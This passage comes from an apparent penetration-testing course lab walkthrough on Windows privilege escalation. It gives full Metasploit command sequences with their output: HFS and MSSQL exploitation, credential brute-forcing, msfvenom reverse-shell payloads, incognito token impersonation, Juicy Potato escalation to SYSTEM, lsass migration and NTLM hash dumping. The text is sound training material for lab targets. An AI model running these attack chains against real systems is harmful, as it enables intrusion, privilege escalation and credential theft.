[*] Meterpreter session 1 opened (10.10.42.5:4444 -> 10.4.18.194:49766) at 2024-08-12 19:07:11 +0530 ←
[*] Server stopped.
```

**Explanation:** The exploit successfully opens a Meterpreter session on the target machine by exploiting the `HttpFileServer 2.3.x` vulnerability. The reverse shell payload connects back to the attacker's machine.

_List active sessions and interact with the opened Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to understand the privileges of the current process._

`getuid`:
```
Server username: NT AUTHORITY\LOCAL SERVICE ←
```

**Explanation:** The `getuid` command reveals that the Meterpreter session is running under the `LOCAL SERVICE` account, which has limited privileges.

_List the enabled privileges of the current process to identify potential privilege escalation vectors._

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege ←
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege
```

**Explanation:** The presence of the `SeImpersonatePrivilege` allows the use of token impersonation techniques to escalate privileges on the target machine.

_Load the `Incognito` extension to enable token manipulation within Meterpreter._

`load incognito`:
```
Loading extension incognito...Success. ←
```

_List the available tokens to check if there is a token that can be impersonated for privilege escalation._

`list_tokens -u`:
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator ←
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available
```

**Explanation:** The `list_tokens -u` command reveals that the `Administrator` delegation token is available, which can be impersonated to escalate privileges to an administrative level.

_Impersonate the `Administrator` token to escalate the current session's privileges._

`impersonate_token "ATTACKDEFENSE\Administrator"`:
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator ←
```

**Explanation:** The successful impersonation of the `Administrator` token elevates the privileges of the Meterpreter session to that of the `Administrator` account.

_Verify that the impersonation was successful by checking the current user context again._

`getuid`:
```
Server username: ATTACKDEFENSE\Administrator ←
```

**Explanation:** The `getuid` command now shows that the Meterpreter session is running with `Administrator` privileges.

_Migrate the Meterpreter session to the `lsass.exe` process to stabilize the session._

`migrate -N lsass.exe`:
```
[*] Migrating from 4760 to 788...
[*] Migration completed successfully. ←
```

**Explanation:** Migrating the session to the `lsass.exe` process helps maintain a stable and highly privileged session, reducing the likelihood of detection or session termination.

_Search for files containing the word "flag" to locate the target file containing the flag._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Desktop\flag.txt ←
```

_Display the contents of the flag file to retrieve the flag._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
x28c832a39730b7d46d6c38f1ea18e12 ←
```

### Impersonation Attacks: Juicy Potato - Theory

#### Juicy Potato

<u>Juicy Potato is a Windows privilege escalation exploit</u> that leverages specific vulnerabilities related to DCOM (Distributed Component Object Model) and the way Windows manages the communication between processes and services.

It primarily targets Windows' token manipulation features <u>to achieve privilege escalation from a lower-privilege user to a system-level or administrative-level user</u>.

Juicy Potato is based on a technique called "Potato", which involves exploiting the behavior of DCOM and the RpcSs (Remote Procedure Call Subsystem) service.

The exploit leverages Windows' capability to create LocalService/NetworkService tokens and then use those tokens to impersonate higher-privilege accounts like SYSTEM.

#### How it works

**DCOM and CLSIDs:**
**Windows DCOM uses CLSIDs (Class Identifiers)** to manage communication between different software components. When a request is made to DCOM, it can lead to the creation of new processes running under specific security contexts.

**Manipulating LocalService Tokens:**
**Juicy Potato exploits a vulnerability** in how DCOM processes and services interact, particularly when creating tokens. It does this by leveraging the LocalService token to get access to a higher-privilege context.

**Creating a Malicious COM Server:**
**The exploit creates a fake COM server** and registers it with a specific CLSID. This allows the attacker to direct requests to their malicious COM server, enabling them to manipulate the token used for that process.

**Impersonation and Token Duplication:**
**Once the malicious COM server is registered and the process initiated**, Juicy Potato can create a LocalService token and then manipulate it to impersonate a high-privilege context like SYSTEM.
**By duplicating and adjusting the token**, the exploit achieves privilege escalation.

### Impersonation Attacks: Juicy Potato - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, escalate privilege using [Juicy Potato](https://github.com/ohpe/juicy-potato) Metasploit local exploit module. 

**Objective**: Gain the highest privilege on the compromised machine and get two flags.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration to confirm the IP address of the attacker machine._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 2081  bytes 184554 (180.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2152  bytes 2385776 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.46.2  netmask 255.255.255.0  broadcast 10.10.46.255 ←
        ether 02:42:0a:0a:2e:02  txqueuelen 0  (Ethernet)
        RX packets 12  bytes 936 (936.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5495  bytes 17603817 (16.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5495  bytes 17603817 (16.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Read the target machine's IP address from the provided text file._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.29.255 ←
```

_Verify connectivity to the target machine by sending ICMP echo requests (ping)._

`ping -c 3 10.4.29.255`:
```
PING 10.4.29.255 (10.4.29.255) 56(84) bytes of data.
64 bytes from 10.4.29.255: icmp_seq=1 ttl=125 time=8.53 ms
64 bytes from 10.4.29.255: icmp_seq=2 ttl=125 time=9.43 ms
64 bytes from 10.4.29.255: icmp_seq=3 ttl=125 time=8.59 ms

--- 10.4.29.255 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 8.528/8.851/9.432/0.411 ms
```

Use `nmap` to perform a full TCP port scan and version detection on the target machine to identify open ports and running services.

`nmap -Pn -sS -sV 10.4.29.255 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-12 20:41 IST
Nmap scan report for 10.4.29.255
Host is up (0.0085s latency).
Not shown: 65508 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-12 15:12:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CONTOSO)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000 ←
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
54207/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
Service Info: Host: MSSQL-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.56 seconds
```

_Further probe the MS SQL service to gather detailed information, such as version and product details._

`nmap --script ms-sql-info 10.4.29.255 -p 1433`:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-12 20:52 IST
Nmap scan report for 10.4.29.255
Host is up (0.0094s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.4.29.255:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

_Launch Metasploit to attempt a brute-force login against the identified MS SQL service using a common username and password list._

`msfconsole -q`

_Search for a suitable module to perform MS SQL login brute force._

`search mssql_login`, `use auxiliary/scanner/mssql/mssql_login`, `show options`, `set RHOSTS 10.4.29.255`, `set RPORT 1433`, `set USER_FILE /root/Desktop/wordlist/common_users.txt`, `set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt`, `set VERBOSE false`, `run`:
```
[*] 10.4.29.255:1433      - 10.4.29.255:1433 - MSSQL - Starting authentication scanner.
[+] 10.4.29.255:1433      - 10.4.29.255:1433 - Login Successful: WORKSTATION\sa: ←
[+] 10.4.29.255:1433      - 10.4.29.255:1433 - Login Successful: WORKSTATION\dbadmin:anamaria ←
[+] 10.4.29.255:1433      - 10.4.29.255:1433 - Login Successful: WORKSTATION\auditor:nikita ←
[*] 10.4.29.255:1433      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

_Select the MS SQL payload module to execute a reverse shell payload using the obtained credentials._

`search mssql_payload`, `use exploit/windows/mssql/mssql_payload`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS 10.4.29.255`, `set LHOST 10.10.46.2`, `set LPORT 4444`, `set USERNAME dbadmin`, `set PASSWORD anamaria`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.46.2:4444 
[*] 10.4.29.255:1433 - Command Stager progress -   1.47% done (1499/102246 bytes)
[*] 10.4.29.255:1433 - Command Stager progress -   2.93% done (2998/102246 bytes)
[*] 10.4.29.255:1433 - Command Stager progress -   4.40% done (4497/102246 bytes)

...

[*] 10.4.29.255:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Sending stage (175174 bytes) to 10.4.29.255
[*] Meterpreter session 1 opened (10.10.46.2:4444 -> 10.4.29.255:60389) at 2024-08-12 21:03:37 +0530 ←
```

_List active sessions and interact with the opened Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to understand the privileges of the current process._

`getuid`:
```
Server username: NT Service\MSSQL$SQLEXPRESS ←
```

_List the enabled privileges of the current process to identify potential privilege escalation vectors._

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege ←
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege ←
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeMachineAccountPrivilege
```

_Load the `incognito` extension to enable token manipulation within Meterpreter._

`load incognito`:
```
Loading extension incognito...Success. ←
```

_List the available tokens to check if there's a token that can be impersonated for privilege escalation._

`list_tokens -u`:
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available ←
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT Service\MSSQL$SQLEXPRESS
NT SERVICE\SQLTELEMETRY$SQLEXPRESS

Impersonation Tokens Available
========================================
No tokens available
```

_Background the current Meterpreter session to set up a listener for the reverse shell that will be used in the privilege escalation._

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Use Metasploit to create a multi-handler that will catch the reverse shell._

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.46.2`, `set LPORT 5555`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.46.2:5555 ←
```

_Generate a reverse shell executable payload using `msfvenom`._

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.46.2 LPORT=5555 -f exe -o /root/Desktop/reverse_shell.exe`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/reverse_shell.exe ←
```

_Confirm the presence of the `JuicyPotato` executable, which will be used for the privilege escalation._

`ls -alps /root/Desktop/tools`:
```
total 52
4 drwxr-xr-x 1 root root 4096 Aug 19  2021 ./
4 drwxr-xr-x 1 root root 4096 Aug 12 21:15 ../
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 Delorean/
4 drwxr-xr-x 3 root root 4096 Dec  7  2020 JohnTheRipper/
4 drwxr-xr-x 1 root root 4096 Aug 19  2021 JuicyPotato/ ←
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 firepwd/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 ircsnapshot/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 known_hosts-hashcat/
4 drwxr-xr-x 3 root root 4096 Dec  7  2020 portable/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 reGeorg/
4 drwxr-xr-x 1 root root 4096 Aug 19  2021 scripts/
4 drwxr-xr-x 1 root root 4096 Aug 17  2021 srtp-decrypt/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 steganography/
```

`ls -alps /root/Desktop/tools/JuicyPotato`:
```
total 348
  4 drwxr-xr-x 1 root root   4096 Aug 19  2021 ./
  4 drwxr-xr-x 1 root root   4096 Aug 19  2021 ../
340 -rw-r--r-- 1 root root 347648 Aug 10  2018 JuicyPotato.exe ←
```

_Reconnect to the initial Meterpreter session to proceed with the privilege escalation._

`sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current working directory on the victim machine._

`pwd`:
```
C:\Windows\system32
```

_Navigate to the desktop directory of the `MSSQL$SQLEXPRESS` user._

`cd 'C:\Users'`,`ls`:
```
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2021-01-20 11:55:51 +0530  Administrator
40777/rwxrwxrwx   0     dir   2016-07-16 19:04:35 +0530  All Users
40555/r-xr-xr-x   8192  dir   2016-07-16 11:34:24 +0530  Default
40777/rwxrwxrwx   0     dir   2016-07-16 19:04:35 +0530  Default User
40777/rwxrwxrwx   8192  dir   2021-01-20 12:46:55 +0530  MSSQL$SQLEXPRESS ←
40555/r-xr-xr-x   4096  dir   2016-07-16 18:53:21 +0530  Public
40777/rwxrwxrwx   8192  dir   2021-01-20 12:47:14 +0530  SQLTELEMETRY$SQLEXPRESS
100666/rw-rw-rw-  174   fil   2016-07-16 18:53:24 +0530  desktop.ini
```

`cd MSSQL$SQLEXPRESS\Desktop`

`pwd`:
```
C:\Users\MSSQL$SQLEXPRESS\Desktop
```

_Upload the reverse shell executable to the target machine._

`upload /root/Desktop/reverse_shell.exe`:
```
[*] uploading  : /root/Desktop/reverse_shell.exe -> reverse_shell.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/Desktop/reverse_shell.exe -> reverse_shell.exe
[*] uploaded   : /root/Desktop/reverse_shell.exe -> reverse_shell.exe ←
```

_Upload the `JuicyPotato` executable to the target machine._

`upload /root/Desktop/tools/JuicyPotato/JuicyPotato.exe`:
```
[*] uploading  : /root/Desktop/tools/JuicyPotato/JuicyPotato.exe -> JuicyPotato.exe
[*] Uploaded 339.50 KiB of 339.50 KiB (100.0%): /root/Desktop/tools/JuicyPotato/JuicyPotato.exe -> JuicyPotato.exe
[*] uploaded   : /root/Desktop/tools/JuicyPotato/JuicyPotato.exe -> JuicyPotato.exe ←
```

`ls`:
```
Listing: C:\Users\MSSQL$SQLEXPRESS\Desktop
==========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  347648  fil   2024-08-12 21:21:46 +0530  JuicyPotato.exe ←
100666/rw-rw-rw-  282     fil   2021-01-20 12:46:56 +0530  desktop.ini
100777/rwxrwxrwx  73802   fil   2024-08-12 21:21:30 +0530  reverse_shell.exe ←
```

We need CLSID in order to escalate the current privilege to the NT SYSTEM.

**CLSID**: A CLSID is a globally unique identifier that identifies a COM class object (source: https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm).

**Explanation:** The `JuicyPotato` exploit works by leveraging the SeImpersonatePrivilege in Windows. It can elevate privileges to `NT AUTHORITY\SYSTEM` by launching a COM server with a specific CLSID (a unique identifier for COM classes). The CLSID for Windows Server 2016 was chosen for this exploit.

_Identify the operating system and architecture to choose the appropriate CLSID._

`sysinfo`:
```
Computer        : MSSQL-SERVER
OS              : Windows 2016+ (10.0 Build 14393). ←
Architecture    : x64
System Language : en_US
Domain          : CONTOSO
Logged On Users : 6
Meterpreter     : x86/windows
```

We can find all CLSID for Windows Server 2016: http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/

**Explanation:** The `sysinfo` command reveals that the target machine is running Windows Server 2016, allowing us to select the appropriate CLSID for the `JuicyPotato` exploit. The CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` is known to work on Windows Server 2016.

_Launch a command shell within Meterpreter to execute the `JuicyPotato` exploit._

`shell`

_Execute `JuicyPotato` with the selected CLSID to spawn a reverse shell with `NT AUTHORITY\SYSTEM` privileges._

`./JuicyPotato.exe -l 5555 -p ./reverse_shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}`:
```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 5555
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM ←

[*] Sending stage (175174 bytes) to 10.4.29.255

[+] CreateProcessWithTokenW OK
```

```
[*] Meterpreter session 2 opened (10.10.46.2:5555 -> 10.4.29.255:52657) at 2024-08-12 21:33:02 +0530 ←
```

**Explanation:** The `JuicyPotato` tool successfully exploited the CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` to elevate privileges to `NT AUTHORITY\SYSTEM`. The reverse shell payload was executed, opening a new Meterpreter session with system-level privileges.

_Exit the current shell and background the session to interact with the new session._

`exit`

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_List active sessions to confirm the creation of the new Meterpreter session with elevated privileges._

`sessions`, `sessions -i 2`

_Verify that the new session is running under `NT AUTHORITY\SYSTEM`._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

**Explanation:** The `getuid` command confirms that the new Meterpreter session has full system privileges, indicated by the `NT AUTHORITY\SYSTEM` user context.

_Migrate the Meterpreter session to the `lsass.exe` process to stabilize the session._

`migrate -N lsass.exe`:
```
[*] Migrating from 2700 to 764...
[*] Migration completed successfully. ←
```

**Explanation:** Migrating the Meterpreter session to the `lsass.exe` process ensures that the session is running within a highly privileged and stable process, reducing the risk of termination.

_Dump the NTLM password hashes from the target machine to retrieve credentials._

`hashdump`:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e58b314aaf7595c4c21e62ae64950fc:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice:1113:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
bob:1114:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
sysadmin:1115:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
MSSQL-SERVER$:1009:aad3b435b51404eeaad3b435b51404ee:b3c13c3f3533c7355ff50b14d6e3c250:::
```

**Explanation:** The `hashdump` command reveals NTLM password hashes, which could be useful for lateral movement or further exploitation within the network.

_Search the target machine for files containing the word "flag" to locate the target file containing the flag._

`shell`, `where /r C:\ "*flag*"`:
```
C:\flag.txt ←
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
```

_Display the contents of the flag file to retrieve the flag._

`type C:\flag.txt`:
```
78598a9b8d36f0112c54356135493fd0 ←
```

### Bypassing UAC: UACMe - Theory

#### UAC (User Account Control)

User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.

A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.

Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

![UAC (User Account Control)](07_privilege_escalation_user_account_control.png)

#### Bypassing UAC

In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.

UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.

UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.

There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

#### Bypassing UAC With UACMe

[UACMe](https://github.com/hfiref0x/UACME) is an open source, robust privilege escalation tool developed by @hfiref0x. It can be used to bypass Windows UAC by leveraging various techniques.

The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.

It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.

The UACMe GitHub repository has [more than 60 exploits](https://github.com/hfiref0x/UACME/blob/master/README.md) that can be used to bypass UAC depending on the version of Windows running on the target.

### Bypassing UAC: UACMe - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) using the [UACME](https://github.com/hfiref0x/UACME) tool. 

**UACME:**
- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has [65+ methods](https://github.com/hfiref0x/UACME/blob/master/README.md) that can be used by the user to bypass UAC depending on the Windows OS version.
- Written majorly in C, with some code in C++

**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the IP configuration of the attacker machine to identify the interface that will be used for the attack._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 1812  bytes 164734 (160.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2123  bytes 2378970 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.46.4  netmask 255.255.255.0  broadcast 10.10.46.255 ←
        ether 02:42:0a:0a:2e:04  txqueuelen 0  (Ethernet)
        RX packets 10  bytes 796 (796.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4371  bytes 18539212 (17.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4371  bytes 18539212 (17.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Retrieve the target machine’s IP address from the provided text file to ensure you are targeting the correct system._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.16.255 ←
```

_Verify that the target machine is reachable by pinging it._

`ping -c 3 10.4.16.255`:
```
PING 10.4.16.255 (10.4.16.255) 56(84) bytes of data.
64 bytes from 10.4.16.255: icmp_seq=1 ttl=125 time=10.8 ms
64 bytes from 10.4.16.255: icmp_seq=2 ttl=125 time=10.4 ms
64 bytes from 10.4.16.255: icmp_seq=3 ttl=125 time=8.88 ms

--- 10.4.16.255 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 8.876/10.025/10.806/0.830 ms
```

_Scan the target machine to identify open ports and running services using Nmap._

`nmap -Pn -sS -sV 10.4.16.255 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-12 23:38 IST
Nmap scan report for 10.4.16.255
Host is up (0.0091s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3 ←
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
49180/tcp open  msrpc              Microsoft Windows RPC
49181/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.98 seconds
```

**Explanation:** The Nmap scan reveals that port 80 is open and running `HttpFileServer` (HFS) version 2.3, which is known to be vulnerable to remote code execution. This will be the initial entry point.

_Launch Metasploit to exploit the identified HFS vulnerability and establish an initial foothold on the target machine._

`msfconsole -q`

_Search for the HFS exploit and configure the necessary options for the attack._

`search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS 10.4.16.255`, `set LHOST 10.10.46.4`, `set LPORT 4444`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.46.4:4444 
[*] Using URL: http://0.0.0.0:8080/qmzlArNNuH4m8C
[*] Local IP: http://10.10.46.4:8080/qmzlArNNuH4m8C
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /qmzlArNNuH4m8C
[*] Sending stage (175174 bytes) to 10.4.16.255
[*] Meterpreter session 1 opened (10.10.46.4:4444 -> 10.4.16.255:49238) at 2024-08-12 23:35:10 +0530 ←
[*] Server stopped.
```

**Explanation:** The exploit successfully opens a Meterpreter session, providing initial access to the target machine.

_Interact with the Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user on the compromised machine to confirm the level of access._

`getuid`:
```
Server username: VICTIM\admin ←
```

_Check if the compromised user is part of the Administrators group._

`shell`, `net localgroup Administrators`:
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin ←
Administrator
The command completed successfully.
```

**Explanation:** The user `admin` is a member of the Administrators group, but without elevated privileges due to UAC restrictions. Bypassing UAC will be necessary to gain full control.

_Exit the shell and check for any enabled privileges associated with the current process._

`exit`

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

**Explanation:** Although some privileges are enabled, the absence of critical privileges like `SeDebugPrivilege` indicates the need for privilege escalation.

